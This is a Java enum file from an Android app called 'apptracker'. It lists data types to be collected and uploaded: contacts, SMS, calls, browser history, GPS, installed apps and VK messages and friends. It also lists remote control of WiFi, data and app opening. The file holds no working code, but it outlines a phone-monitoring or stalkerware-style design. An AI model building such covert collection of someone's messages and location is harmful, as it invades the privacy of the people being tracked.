package com.frostweepgames.apptracker.settings;

/**-------------------------------
 * Created by artem on 21.02.2018.
 * Powered by Frostweep Games
 * All rights reserved!
 * (c)2013-2018
 * www.frostweepgames.com
 ---------------------------------*/

public class Enumerators
{
    public enum UIPageType
    {
        MAIN_PAGE,
        SETTINGS_PAGE
    }

    public enum ControllerType
    {
        SYSTEM,

        CONTACTS,
        SMS,
        CALLS,
        BROWSER_HISTORY,
        INSTALLED_APPS,
        GPS,
        MOBILE_INFO
    }

    public enum APINetRequestType
    {
        UPDATE_CONTACTS,
        UPDATE_CALLS,
        UPDATE_SMS,
        UPDATE_GPS,
        UPDATE_INSTALLED_APPS,
        UPDATE_BROWSER_HISTORY,
        GET_SETTINGS,
        SEND_ALARM,
        SEND_SYSTEM,
        CHECK,
        SYNC_SETTINGS,
        SEND_VK_MESSAGES,
        SEND_VK_GROUPS,
        SEND_VK_DIALOGS,
        SEND_VK_FRIENDS
    }

    public enum NetworkRequestType
    {
        POST,
        GET
    }

    public enum PhoneActionType
    {
        input,
        output,
        missed,
        blocked,
        rejected,
        unknown
    }

    public enum SMSActionType
    {
        input,
        output,
        draft,
        queued,
        sent,
        failed,
        all

    }

    public enum SystemFuncControlType
    {
        WIFI,
        MOBILE_DATA,
        APP_OPENING,
        SETTINGS_UPDATE,
    }

    public enum PhoneType
    {
        CDMA,
        GSM,
        SIP,
        NONE,
        UNKNOWN
    }

}
